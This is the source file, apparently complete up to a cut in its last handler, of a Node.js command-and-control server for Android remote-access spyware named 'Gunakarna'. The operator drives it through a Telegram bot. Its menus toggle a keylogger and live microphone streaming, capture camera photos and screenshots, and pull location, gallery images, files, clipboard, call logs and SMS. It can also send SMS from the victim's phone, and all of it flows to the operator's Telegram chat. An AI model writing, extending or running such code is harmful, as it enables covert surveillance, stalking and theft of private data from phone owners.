// ============================================================
// load .env FIRST
// ============================================================
require('dotenv').config();

const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const http = require('http');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const os = require('os');
const path = require('path');

// ============================================================
// CONFIGURATION — from .env
// ============================================================

const TELEGRAM_TOKEN = process.env.BOT_TOKEN;
const ALLOWED_CHAT_ID = Number(process.env.ALLOWED_CHAT_ID);

const WS_PORT = Number(process.env.WS_PORT) || 8080;
const HTTP_PORT = Number(process.env.HTTP_PORT) || 3001;
const MAX_TEXT = 4096;
const CMD_TIMEOUT = 90_000;

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

const wss = new WebSocket.Server({ port: WS_PORT });

// uuid -> device info
const appClients = new Map();
// reqId -> { chatId, type, command, device, caption, filename, format }
const pending = new Map();
// chatId -> { type, uuid }  (user is about to reply to a force-reply prompt)
const waiting = new Map();

// ---------- NEW: per-device state toggles ----------
const deviceState = new Map(); // uuid -> { keylogger, flashlight, galleryView }

function getDeviceState(uuid) {
    if (!deviceState.has(uuid)) {
        deviceState.set(uuid, { keylogger: false, flashlight: false, galleryView: false });
    }
    return deviceState.get(uuid);
}

console.log('[*] Telegram bot started');
console.log(`[*] WebSocket server: ws://localhost:${WS_PORT}`);
console.log(`[*] HTTP status server: http://localhost:${HTTP_PORT}/status`);

// ============================================================
// HTTP STATUS SERVER
// ============================================================

http.createServer((req, res) => {
    if (req.url === '/status') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        const devices = Array.from(appClients.entries()).map(([uuid, d]) => ({
            uuid,
            model: d.model,
            ...getDeviceState(uuid)
        }));
        res.end(JSON.stringify({
            status: 'ok',
            devices: appClients.size,
            devicesList: devices,
            uptime: Math.round(process.uptime())
        }));
    } else {
        res.writeHead(404);
        res.end();
    }
}).listen(HTTP_PORT, '0.0.0.0');

// ============================================================
// HELPERS
// ============================================================

function escapeHtml(value) {
    return String(value ?? '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

function authorized(chatId) {
    return Number(chatId) === Number(ALLOWED_CHAT_ID);
}

function getDevice(uuid) {
    return appClients.get(uuid);
}

function findDeviceByWs(ws) {
    for (const device of appClients.values()) {
        if (device.ws === ws) return device;
    }
    return null;
}

// Split long text into <=4096 char chunks
async function sendText(chatId, text, options = {}) {
    const chunks = [];
    for (let i = 0; i < text.length; i += MAX_TEXT) {
        chunks.push(text.slice(i, i + MAX_TEXT));
    }
    for (let i = 0; i < chunks.length; i++) {
        const chunk = chunks.length > 1 && i > 0
            ? `[${i + 1}/${chunks.length}]\n${chunks[i]}`
            : chunks[i];
        await bot.sendMessage(chatId, chunk, options);
    }
}

// Send a command to a device and register the pending response
function sendCommand(device, command, args, type, extra = {}) {
    const reqId = uuidv4();
    pending.set(reqId, {
        chatId: extra.chatId,
        type,
        command,
        device,
        caption: extra.caption,
        filename: extra.filename,
        format: extra.format
    });
    const payload = JSON.stringify(args || {});
    device.ws.send(`CMD|${device.uuid}|${reqId}|${command}|${payload}`);
    console.log(`[CMD] ${device.model} -> ${command}`);

    setTimeout(() => {
        if (pending.has(reqId)) {
            pending.delete(reqId);
            bot.sendMessage(extra.chatId,
                `⏱ No response from ${device.model} (${command})`).catch(() => {});
        }
    }, CMD_TIMEOUT);
}

function fmtSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / 1048576).toFixed(1) + ' MB';
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

// ============================================================
// RESPONSE HANDLING
// ============================================================

async function handleResp(uuid, reqId, command, payloadRaw) {
    const device = getDevice(uuid);
    if (!device) return;

    let payload = {};
    try { payload = JSON.parse(payloadRaw || '{}'); }
    catch { payload = { raw: payloadRaw }; }

    // ---------- MIC: audio chunks ----------
    if (command === 'mic_chunk' && payload.audio) {
        const file = path.join(os.tmpdir(), `mic_${Date.now()}.m4a`);
        fs.writeFileSync(file, Buffer.from(payload.audio, 'base64'));
        try {
            const chatId = device.lastChatId || ALLOWED_CHAT_ID;
            await bot.sendAudio(chatId, file, {
                caption: `🎙️ ${device.model} • ${new Date().toLocaleTimeString()}`
            });
        } catch (e) {
            console.error('[MIC] send error:', e.message);
        } finally {
            try { fs.unlinkSync(file); } catch (ignored) {}
        }
        return;
    }

    // ---------- KEYLOGGER keystroke stream ----------
    if (command === 'keylog_chunk' && payload.keys) {
        const chatId = device.lastChatId || ALLOWED_CHAT_ID;
        await bot.sendMessage(chatId,
            `⌨️ <b>${escapeHtml(device.model)}</b> keys:\n<code>${escapeHtml(payload.keys)}</code>`,
            { parse_mode: 'HTML' });
        return;
    }

    const p = pending.get(reqId);
    if (!p) {
        console.log(`[RESP] unhandled ${command} from ${device.model}`);
        return;
    }
    pending.delete(reqId);
    const chatId = p.chatId;

    try {
        switch (p.type) {

            case 'text':
            case 'ack':
                if (payload.error) {
                    await bot.sendMessage(chatId, `🔴 ${payload.error}`);
                    break;
                }
                await sendText(chatId, p.format ? p.format(payload) : JSON.stringify(payload), {
                    parse_mode: 'HTML'
                });
                break;

            case 'photo': {
                if (payload.error) {
                    await bot.sendMessage(chatId, `🔴 ${payload.error}`);
                    break;
                }
                const buf = Buffer.from(payload.image, 'base64');
                if (buf.length > 10_000_000) {
                    await bot.sendDocument(chatId, buf, {
                        filename: 'capture.jpg',
                        caption: p.caption
                    });
                } else {
                    await bot.sendPhoto(chatId, buf, { caption: p.caption });
                }
                break;
            }

            case 'document': {
                if (payload.error) {
                    await bot.sendMessage(chatId, `🔴 ${payload.error}`);
                    break;
                }
                let buf;
                if (payload.data) {
                    buf = Buffer.from(payload.data, 'base64');
                } else if (payload.text) {
                    buf = Buffer.from(payload.text, 'utf8');
                } else {
                    break;
                }
                await bot.sendDocument(chatId, buf, { filename: p.filename });
                break;
            }

            case 'location': {
                if (payload.error) {
                    await bot.sendMessage(chatId, `🔴 ${payload.error}`);
                    break;
                }
                await bot.sendLocation(chatId, payload.lat, payload.lon);
                await bot.sendMessage(chatId,
                    `📍 <b>${escapeHtml(device.model)}</b>\n` +
                    `🌐 ${payload.lat}, ${payload.lon}\n` +
                    `🎯 ±${payload.accuracy}m\n\n` +
                    `https://maps.google.com/?q=${payload.lat},${payload.lon}`,
                    { parse_mode: 'HTML' });
                break;
            }

            case 'gallery':
                await streamGallery(device, chatId, payload);
                break;

            case 'file':
                await handleFileResp(chatId, payload, device);
                break;
        }
    } catch (e) {
        console.error('[RESP] send error:', e.message);
    }
}

async function streamGallery(device, chatId, payload) {
    if (payload.error) {
        await bot.sendMessage(chatId, `🔴 ${payload.error}`);
        return;
    }
    const paths = payload.paths || [];
    if (paths.length === 0) {
        await bot.sendMessage(chatId, '🖼️ Gallery is empty.');
        return;
    }
    const batch = paths.slice(0, 10);
    await bot.sendMessage(chatId, `🖼️ Streaming ${batch.length} images from ${device.model}...`);
    for (let i = 0; i < batch.length; i++) {
        sendCommand(device, 'gallery_get', { path: batch[i] }, 'photo', {
            chatId,
            caption: `🖼️ ${device.model} • ${i + 1}/${batch.length}`
        });
        await sleep(900);
    }
}

async function handleFileResp(chatId, payload, device) {
    if (payload.error) {
        await bot.sendMessage(chatId, `🔴 ${payload.error}`);
        return;
    }

    if (payload.files) {
        const list = payload.files;
        if (list.length === 0) {
            await bot.sendMessage(chatId, `📁 ${escapeHtml(payload.path)} — empty folder.`);
            return;
        }
        const lines = list.map((f, i) =>
            `${i + 1}. ${f.dir ? '📂' : '📄'} ${escapeHtml(f.name)}${f.dir ? '/' : ' • ' + fmtSize(f.size)}`);
        await sendText(chatId, `📁 <b>${escapeHtml(payload.path)}</b>\n\n` + lines.join('\n'), {
            parse_mode: 'HTML'
        });
        await bot.sendMessage(chatId,
            `Reply with a subfolder path to open it, or a file path to download it.`,
            { reply_markup: { force_reply: true, input_field_placeholder: payload.path } });
        return;
    }

    if (payload.data) {
        const buf = Buffer.from(payload.data, 'base64');
        await bot.sendDocument(chatId, buf, { filename: payload.name || 'file' });
    }
}

// ============================================================
// RESPONSE FORMATTERS
// ============================================================

function fmtInfo(d) {
    return '╭────────────────────────────╮\n' +
           '│   📱 <b>DEVICE INFO</b>      │\n' +
           '╰────────────────────────────╯\n\n' +
        `📱 Model: <b>${escapeHtml(d.model)}</b>\n` +
        `🏷️ Brand: ${escapeHtml(d.brand || '?')}\n` +
        `🆔 Android ID: <code>${escapeHtml(d.androidId || '?')}</code>\n` +
        `🤖 Android: ${escapeHtml(d.version)} (SDK ${escapeHtml(d.sdk)})\n` +
        `🔋 Battery: ${escapeHtml(d.battery)} • ${escapeHtml(d.charging)}\n` +
        `📶 Network: ${escapeHtml(d.network)}\n` +
        `📡 Provider: ${escapeHtml(d.provider)}\n` +
        `💡 Brightness: ${escapeHtml(d.brightness)}\n` +
        `🖥️ Screen: ${d.screenOn ? 'ON 🟢' : 'OFF ⚫'}\n` +
        `🌐 Locale: ${escapeHtml(d.locale)}`;
}

function fmtRealtime(d) {
    return '📊 <b>REAL-TIME</b>\n\n' +
        `📱 ${escapeHtml(d.model)}\n` +
        `🔋 Battery: ${escapeHtml(d.battery)} • ${escapeHtml(d.charging)}\n` +
        `📶 Network: ${escapeHtml(d.network)}\n` +
        `💡 Brightness: ${escapeHtml(d.brightness)}\n` +
        `🖥️ Screen: ${d.screenOn ? 'ON 🟢' : 'OFF ⚫'}\n` +
        `🌐 Locale: ${escapeHtml(d.locale)}`;
}

function fmtSecurity(d) {
    return '🛡️ <b>SECURITY</b>\n\n' +
        `🔒 Lock screen: ${d.lockEnabled ? 'ENABLED' : 'DISABLED'}\n` +
        `⚡ Root detected: ${d.rootDetected ? 'YES ⚠️' : 'NO'}\n` +
        `🔌 ADB enabled: ${d.adbEnabled ? 'YES' : 'NO'}`;
}

function fmtApps(arr) {
    if (arr.length === 0) return '📦 No apps found.';
    const lines = arr.slice(0, 60).map((a, i) =>
        `${i + 1}. ${escapeHtml(a.label)} <code>${escapeHtml(a.pkg)}</code>${a.system ? ' [system]' : ''}`);
    return `📦 <b>APPS (${arr.length})</b>\n\n` + lines.join('\n');
}

function fmtAck(d) {
    if (d.error) return `🔴 ${d.error}`;
    if (d.stream) {
        const icons = { media: '🎵', notification: '🔔', alarm: '⏰', ring: '📞' };
        return `${icons[d.stream] || '🔊'} <b>${d.stream.toUpperCase()}</b>: ${d.level}/${d.max}`;
    }
    if (d.status === 'keylogger_on') return '⌨️ <b>Keylogger</b> STARTED ✅';
    if (d.status === 'keylogger_off') return '⌨️ <b>Keylogger</b> STOPPED ✅';
    if (d.status === 'flashlight_on') return '🔦 <b>Flashlight</b> TURNED ON ✅';
    if (d.status === 'flashlight_off') return '🔦 <b>Flashlight</b> TURNED OFF ✅';
    if (d.status === 'gallery_view_on') return '🖼️ <b>Gallery View</b> ENABLED ✅';
    if (d.status === 'gallery_view_off') return '🖼️ <b>Gallery View</b> DISABLED ✅';
    return '✅ Done.';
}

// ============================================================
// KEYBOARDS
// ============================================================

function getPersistentTriggerButton() {
    return {
        keyboard: [[{ text: '😈 Gunakarna 😈' }]],
        resize_keyboard: true,
        one_time_keyboard: false
    };
}

function mainKeyboard() {
    return {
        inline_keyboard: [
            [{ text: '😈 Gunakarna 😈', callback_data: 'gunakarna' }]
        ]
    };
}

function deviceControlKeyboard(uuid) {
    const device = getDevice(uuid);
    const state = getDeviceState(uuid);

    const micLabel = device && device.micOn ? '🎙️ Mic: ON 🔴' : '🎙️ Mic: OFF';
    const vibLabel = device && device.vibrateOn ? '📳 Vibrate: ON' : '📳 Vibrate: OFF';
    const keyLabel = state.keylogger ? '⌨️ Keylog: ON 🟢' : '⌨️ Keylog: OFF';
    const flashLabel = state.flashlight ? '🔦 Flash: ON 🟡' : '🔦 Flash: OFF';
    const galleryLabel = state.galleryView ? '🖼️ Gallery: ON' : '🖼️ Gallery: OFF';

    return {
        inline_keyboard: [
            [
                { text: '📱 Info', callback_data: `device_info:${uuid}` },
                { text: '📊 Real-time', callback_data: `realtime:${uuid}` }
            ],
            [
                { text: '🛡️ Security', callback_data: `security:${uuid}` },
                { text: '📦 Apps', callback_data: `apps:${uuid}` }
            ],
            [
                { text: '📷 Camera', callback_data: `camera:${uuid}` },
                { text: micLabel, callback_data: `mic:${uuid}` }
            ],
            [
                { text: '🖼️ Gallery', callback_data: `gallery:${uuid}` },
                { text: '🔎 Browser', callback_data: `browser:${uuid}` }
            ],
            [
                { text: '🖥️ Screenshot', callback_data: `screenshot:${uuid}` },
                { text: '📍 Location', callback_data: `location:${uuid}` }
            ],
            [
                { text: '🔔 Notify', callback_data: `notify:${uuid}` },
                { text: vibLabel, callback_data: `vibrate:${uuid}` }
            ],
            [
                { text: '📁 Files', callback_data: `files:${uuid}` },
                { text: '📋 Clipboard', callback_data: `clipboard:${uuid}` }
            ],
            [
                { text: '📞 Calls', callback_data: `calls:${uuid}` },
                { text: keyLabel, callback_data: `keylogger:${uuid}` }
            ],
            [
                { text: '✉️ SMS Inbox', callback_data: `sms_received:${uuid}` },
                { text: '✉️ SMS Send', callback_data: `sms_send:${uuid}` }
            ],
            [
                { text: flashLabel, callback_data: `flashlight:${uuid}` },
                { text: galleryLabel, callback_data: `gallery_toggle:${uuid}` }
            ],
            [
                { text: '⚙️ Settings', callback_data: `settings:${uuid}` },
                { text: '🔙 Devices', callback_data: 'gunakarna' }
            ]
        ]
    };
}

function cameraKeyboard(uuid) {
    return {
        inline_keyboard: [
            [{ text: '📷 Front Camera', callback_data: `camera_front:${uuid}` }],
            [{ text: '📷 Back Camera', callback_data: `camera_back:${uuid}` }],
            [{ text: '🔙 Device Control', callback_data: `device:${uuid}` }]
        ]
    };
}

function settingsKeyboard(uuid) {
    const row = (label, stream) => [
        { text: `${label} ➕`, callback_data: `audio:${uuid}:${stream}:1` },
        { text: `${label} ➖`, callback_data: `audio:${uuid}:${stream}:-1` }
    ];
    return {
        inline_keyboard: [
            row('🔊 Volume', 'media'),
            row('🎵 Media', 'media'),
            row('🔔 Notification', 'notification'),
            row('⏰ Alarm', 'alarm'),
            row('📞 Ring', 'ring'),
            [{ text: '🔙 Device Control', callback_data: `device:${uuid}` }]
        ]
    };
}

// ============================================================
// DEVICE LIST
// ============================================================

async function showGunakarna(chatId, messageId = null) {
    if (appClients.size === 0) {
        const text = '╭────────────────────────────╮\n' +
                     '│   😈 <b>GUNAKARNA</b>          │\n' +
                     '╰────────────────────────────╯\n\n' +
                     '🔴 <b>No devices online</b>\n\n' +
                     'Waiting for an authorized device...';
        const options = {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔄 Refresh', callback_data: 'gunakarna' }]
                ]
            }
        };
        if (messageId) {
            try { return await bot.editMessageText(text, options); } catch { return; }
        }
        return bot.sendMessage(chatId, text, {
            parse_mode: 'HTML',
            reply_markup: options.reply_markup
        });
    }

    const buttons = [];
    let index = 1;
    for (const [uuid, device] of appClients) {
        buttons.push([
            { text: `📱 ${index}. ${device.model} 🟢`, callback_data: `device:${uuid}` }
        ]);
        index++;
    }
    buttons.push([
        { text: '🔄 Refresh Devices', callback_data: 'gunakarna' }
    ]);

    const text = '╭────────────────────────────╮\n' +
                 '│   😈 <b>GUNAKARNA</b>          │\n' +
                 '╰────────────────────────────╯\n\n' +
                 `🟢 Online: <b>${appClients.size}</b>\n\n` +
                 '<b>CONNECTED DEVICES</b>\n\n' +
                 'Select a device:';
    const options = {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: buttons }
    };

    if (messageId) {
        try {
            return await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: messageId,
                ...options
            });
        } catch { return; }
    }
    return bot.sendMessage(chatId, text, options);
}

// ============================================================
// WEB SOCKET SERVER
// ============================================================

wss.on('connection', (ws) => {
    const connectionUuid = uuidv4();
    console.log(`[+] WebSocket connection: ${connectionUuid}`);
    ws.send('PING');

    ws.on('message', (data) => {
        const message = data.toString();

        // ---------- DEVICE AUTH ----------
        if (message.startsWith('AUTH|')) {
            const parts = message.split('|');
            const uuid = parts[1] || connectionUuid;
            let info = {};
            try {
                info = JSON.parse(parts.slice(2).join('|') || '{}');
            } catch {
                console.log('[!] Invalid AUTH JSON');
            }
            const existing = appClients.get(uuid);

            appClients.set(uuid, {
                ws,
                uuid,
                model: info.model || existing?.model || 'Unknown device',
                battery: info.battery || existing?.battery || 'Unknown',
                version: info.version || existing?.version || 'Unknown',
                sdk: info.sdk || existing?.sdk || 'Unknown',
                brightness: info.brightness || existing?.brightness || 'Unknown',
                provider: info.provider || existing?.provider || 'Not available',
                network: info.network || existing?.network || 'Unknown',
                charging: info.charging || existing?.charging || 'Unknown',
                micOn: existing?.micOn || false,
                vibrateOn: existing?.vibrateOn || false,
                lastChatId: existing?.lastChatId,
                connectedAt: existing?.connectedAt || Date.now()
            });

            // init device state if new
            if (!deviceState.has(uuid)) {
                deviceState.set(uuid, { keylogger: false, flashlight: false, galleryView: false });
            }

            ws.uuid = uuid;
            console.log(`[+] Authorized: ${info.model || 'Unknown'} (${uuid})`);

            // Broadcast to Telegram that a new device connected
            try {
                bot.sendMessage(ALLOWED_CHAT_ID,
                    `🟢 <b>New device connected!</b>\n📱 ${info.model || 'Unknown'}\n🔗 ${uuid}`,
                    { parse_mode: 'HTML', reply_markup: getPersistentTriggerButton() });
            } catch (e) {}
            return;
        }

        // ---------- PONG ----------
        if (message === 'PONG') return;

        // ---------- RESPONSE ----------
        const match = message.match(/^RES\|(.+?)\|(.+?)\|(.+?)\|(.+)$/);
        if (match) {
            handleResp(match[1], match[2], match[3], match[4]);
        } else {
            console.log(`[!] Unknown message from ${ws.uuid || 'unknown'}: ${message.slice(0, 100)}`);
        }
    });

    ws.on('close', () => {
        const uuid = ws.uuid;
        if (uuid && appClients.has(uuid)) {
            const device = appClients.get(uuid);
            console.log(`[-] Disconnected: ${device.model} (${uuid})`);
            appClients.delete(uuid);
            // keep state for reconnection
            try {
                bot.sendMessage(ALLOWED_CHAT_ID,
                    `🔴 <b>Device disconnected</b>\n📱 ${device.model}\n🔗 ${uuid}`,
                    { parse_mode: 'HTML', reply_markup: getPersistentTriggerButton() });
            } catch (e) {}
        }
    });
});

// ============================================================
// TELEGRAM BOT — MESSAGE HANDLER
// ============================================================

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    if (!authorized(chatId)) {
        return bot.sendMessage(chatId, '⛔ Unauthorized.');
    }

    // Set the persistent trigger button
    await bot.sendMessage(chatId, '😈 <b>GUNAKARNA BOT READY</b>', {
        parse_mode: 'HTML',
        reply_markup: getPersistentTriggerButton()
    });

    return showGunakarna(chatId);
});

// Handle the persistent trigger button text message
bot.onText(/^😈 Gunakarna 😈$/, async (msg) => {
    const chatId = msg.chat.id;
    if (!authorized(chatId)) return;
    return showGunakarna(chatId);
});

// ============================================================
// TELEGRAM BOT — CALLBACK QUERY HANDLER
// ============================================================

bot.on('callback_query', async (cb) => {
    const chatId = cb.message.chat.id;
    if (!authorized(chatId)) {
        return bot.answerCallbackQuery(cb.id, { text: '⛔ Unauthorized.' });
    }

    const data = cb.data;
    const msgId = cb.message.message_id;

    // ---------- MAIN MENU ----------
    if (data === 'gunakarna') {
        await bot.answerCallbackQuery(cb.id);
        return showGunakarna(chatId, msgId);
    }

    // ---------- DEVICE SELECT ----------
    if (data.startsWith('device:')) {
        const uuid = data.split(':')[1];
        const device = getDevice(uuid);
        if (!device) {
            await bot.answerCallbackQuery(cb.id, { text: '❌ Device offline.' });
            return showGunakarna(chatId, msgId);
        }
        await bot.answerCallbackQuery(cb.id);
        const text = `╭────────────────────────────╮\n` +
                     `│   😈 <b>${escapeHtml(device.model)}</b>     │\n` +
                     `╰────────────────────────────╯\n\n` +
                     `🔋 ${escapeHtml(device.battery)} • ${escapeHtml(device.charging)}\n` +
                     `📶 ${escapeHtml(device.network)}\n` +
                     `🕐 Connected: ${new Date(device.connectedAt).toLocaleString()}\n\n` +
                     `<b>SELECT ACTION:</b>`;
        return bot.editMessageText(text, {
            chat_id: chatId,
            message_id: msgId,
            parse_mode: 'HTML',
            reply_markup: deviceControlKeyboard(uuid)
        });
    }

    // ---------- Extract UUID from any callback ----------
    const uuidMatch = data.match(/[a-f0-9-]{36}/);
    const uuid = uuidMatch ? uuidMatch[0] : null;
    const device = uuid ? getDevice(uuid) : null;

    if (!device) {
        await bot.answerCallbackQuery(cb.id, { text: '❌ Device offline.' });
        return showGunakarna(chatId, msgId);
    }

    // Store last chatId for mic/keylog streaming
    device.lastChatId = chatId;

    await bot.answerCallbackQuery(cb.id);

    // ============================================================
    // NEW: KEYLOGGER TOGGLE
    // ============================================================
    if (data.startsWith('keylogger:')) {
        const state = getDeviceState(uuid);
        const newState = !state.keylogger;
        state.keylogger = newState;
        const cmd = newState ? 'keylogger_start' : 'keylogger_stop';
        sendCommand(device, cmd, {}, 'ack', {
            chatId,
            format: fmtAck
        });
        // Update keyboard to reflect new state
        return bot.editMessageReplyMarkup(
            { inline_keyboard: deviceControlKeyboard(uuid).inline_keyboard },
            { chat_id: chatId, message_id: msgId }
        );
    }

    // ============================================================
    // NEW: FLASHLIGHT TOGGLE
    // ============================================================
    if (data.startsWith('flashlight:')) {
        const state = getDeviceState(uuid);
        const newState = !state.flashlight;
        state.flashlight = newState;
        const cmd = newState ? 'flashlight_on' : 'flashlight_off';
        sendCommand(device, cmd, {}, 'ack', {
            chatId,
            format: fmtAck
        });
        return bot.editMessageReplyMarkup(
            { inline_keyboard: deviceControlKeyboard(uuid).inline_keyboard },
            { chat_id: chatId, message_id: msgId }
        );
    }

    // ============================================================
    // NEW: GALLERY VIEW TOGGLE
    // ============================================================
    if (data.startsWith('gallery_toggle:')) {
        const state = getDeviceState(uuid);
        const newState = !state.galleryView;
        state.galleryView = newState;
        const cmd = newState ? 'gallery_view_on' : 'gallery_view_off';
        sendCommand(device, cmd, {}, 'ack', {
            chatId,
            format: fmtAck
        });
        return bot.editMessageReplyMarkup(
            { inline_keyboard: deviceControlKeyboard(uuid).inline_keyboard },
            { chat_id: chatId, message_id: msgId }
        );
    }

    // ============================================================
    // EXISTING COMMANDS
    // ============================================================

    if (data === `device_info:${uuid}`) {
        sendCommand(device, 'info', {}, 'text', { chatId, format: fmtInfo });
        return bot.editMessageText('📱 Fetching device info...', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: deviceControlKeyboard(uuid)
        });
    }

    if (data === `realtime:${uuid}`) {
        sendCommand(device, 'realtime', {}, 'text', { chatId, format: fmtRealtime });
        return bot.editMessageText('📊 Fetching real-time data...', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: deviceControlKeyboard(uuid)
        });
    }

    if (data === `security:${uuid}`) {
        sendCommand(device, 'security', {}, 'text', { chatId, format: fmtSecurity });
        return bot.editMessageText('🛡️ Checking security...', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: deviceControlKeyboard(uuid)
        });
    }

    if (data === `apps:${uuid}`) {
        sendCommand(device, 'apps', {}, 'text', { chatId, format: fmtApps });
        return bot.editMessageText('📦 Fetching apps...', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: deviceControlKeyboard(uuid)
        });
    }

    if (data === `camera:${uuid}`) {
        return bot.editMessageText('📷 <b>SELECT CAMERA</b>', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: cameraKeyboard(uuid)
        });
    }

    if (data === `camera_front:${uuid}`) {
        sendCommand(device, 'camera', { camera: 'front' }, 'photo', {
            chatId, caption: `📷 ${device.model} • Front Camera`
        });
        return bot.editMessageText('📷 Capturing front camera...', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: cameraKeyboard(uuid)
        });
    }

    if (data === `camera_back:${uuid}`) {
        sendCommand(device, 'camera', { camera: 'back' }, 'photo', {
            chatId, caption: `📷 ${device.model} • Back Camera`
        });
        return bot.editMessageText('📷 Capturing back camera...', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: cameraKeyboard(uuid)
        });
    }

    if (data === `mic:${uuid}`) {
        const newMic = !device.micOn;
        device.micOn = newMic;
        sendCommand(device, newMic ? 'mic_start' : 'mic_stop', {}, 'ack', { chatId, format: fmtAck });
        return bot.editMessageReplyMarkup(
            { inline_keyboard: deviceControlKeyboard(uuid).inline_keyboard },
            { chat_id: chatId, message_id: msgId }
        );
    }

    if (data === `gallery:${uuid}`) {
        sendCommand(device, 'gallery', { limit: 50 }, 'gallery', { chatId });
        return bot.editMessageText('🖼️ Fetching gallery...', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: deviceControlKeyboard(uuid)
        });
    }

    if (data === `browser:${uuid}`) {
        sendCommand(device, 'browser', {}, 'text', { chatId });
        return bot.editMessageText('🔎 Starting browser...', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: deviceControlKeyboard(uuid)
        });
    }

    if (data === `screenshot:${uuid}`) {
        sendCommand(device, 'screenshot', {}, 'photo', {
            chatId, caption: `🖥️ ${device.model} • Screenshot`
        });
        return bot.editMessageText('🖥️ Capturing screenshot...', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: deviceControlKeyboard(uuid)
        });
    }

    if (data === `location:${uuid}`) {
        sendCommand(device, 'location', {}, 'location', { chatId });
        return bot.editMessageText('📍 Fetching location...', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: deviceControlKeyboard(uuid)
        });
    }

    if (data === `notify:${uuid}`) {
        sendCommand(device, 'notify', {}, 'ack', { chatId, format: fmtAck });
        return bot.editMessageText('🔔 Sending notification...', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: deviceControlKeyboard(uuid)
        });
    }

    if (data === `vibrate:${uuid}`) {
        const newVib = !device.vibrateOn;
        device.vibrateOn = newVib;
        sendCommand(device, newVib ? 'vibrate_start' : 'vibrate_stop', {}, 'ack', { chatId, format: fmtAck });
        return bot.editMessageReplyMarkup(
            { inline_keyboard: deviceControlKeyboard(uuid).inline_keyboard },
            { chat_id: chatId, message_id: msgId }
        );
    }

    if (data === `files:${uuid}`) {
        sendCommand(device, 'files', { path: '/' }, 'file', { chatId });
        return bot.editMessageText('📁 Fetching files...', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: deviceControlKeyboard(uuid)
        });
    }

    if (data === `clipboard:${uuid}`) {
        sendCommand(device, 'clipboard', {}, 'text', { chatId });
        return bot.editMessageText('📋 Fetching clipboard...', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: deviceControlKeyboard(uuid)
        });
    }

    if (data === `calls:${uuid}`) {
        sendCommand(device, 'calls', {}, 'document', {
            chatId, filename: `${device.model.replace(/\s+/g, '_')}_calls.txt`
        });
        return bot.editMessageText('📞 Fetching call logs...', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: deviceControlKeyboard(uuid)
        });
    }

    if (data === `settings:${uuid}`) {
        return bot.editMessageText('⚙️ <b>VOLUME SETTINGS</b>', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: settingsKeyboard(uuid)
        });
    }

    if (data === `sms_received:${uuid}`) {
        sendCommand(device, 'sms_received', {}, 'document', {
            chatId, filename: `${device.model.replace(/\s+/g, '_')}_sms_inbox.txt`
        });
        return bot.editMessageText('✉️ Fetching SMS inbox...', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
            reply_markup: deviceControlKeyboard(uuid)
        });
    }

    if (data === `sms_send:${uuid}`) {
        waiting.set(chatId, { type: 'sms_send', uuid });
        return bot.editMessageText(
            '✉️ <b>Send SMS</b>\n\nReply with:\n<code>+1234567890|Message text</code>',
            { chat_id: chatId, message_id: msgId, parse_mode: 'HTML' }
        );
    }

    // ---------- Audio (settings) ----------
    const audioMatch = data.match(/^audio:(.+):(.+):(-?\d+)$/);
    if (audioMatch) {
        const [_, auuid, stream, direction] = audioMatch;
        if (auuid !== uuid) return;
        const delta = parseInt(direction);
        sendCommand(device, 'audio', { stream, delta }, 'ack', { chatId, format: fmtAck });
        return bot.answerCallbackQuery(cb.id, { text: delta > 0 ? '🔊 Volume+' : '🔉 Volume-' });
    }
});

// ============================================================
// TELEGRAM BOT — FORCE-REPLY & TEXT COMMANDS
// ============================================================

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    if (!authorized(chatId)) return;
    if (!msg.text) return;

    // Ignore the trigger button text — already handled via regex
    if (msg.text === '😈 Gunakarna 😈') return;
    if (msg.text.startsWith('/')) return; // commands handled

    // ---------- Waiting for a reply (sms_send, file path, etc.) ----------
    const wait = waiting.get(chatId);
    if (wait) {
        waiting.delete(chatId);

        if (wait.type === 'sms_send') {
            const device = getDevice(wait.uuid);
            if (!device) return bot.sendMessage(chatId, '❌ Device offline.');

            const parts = msg.text.split('|');
            if (parts.length < 2) {
                return bot.sendMessage(chatId, '❌ Format: <code>+1234567890|Message</code>', { parse_mode: 'HTML' });
            }
            const number = parts[0].trim();
            const text = parts.slice(1).join('|').trim();
            sendCommand(device, 'sms_send', { number, text }, 'ack', { chatId, format: fmtAck });
            return bot.sendMessage(chatId, `✉️ Sending SMS to ${number}...`);
        }

        // File navigation
        if (wait.type === 'file') {
            const device = getDevice(wait.uuid);
            if (!device) return bot.sendMessage(chatId, '❌ Device offline.');
            sendCommand(device, 'files', { path: msg.text }, 'file', { chatId });
        }
    }

    // ---------- Unknown text ----------
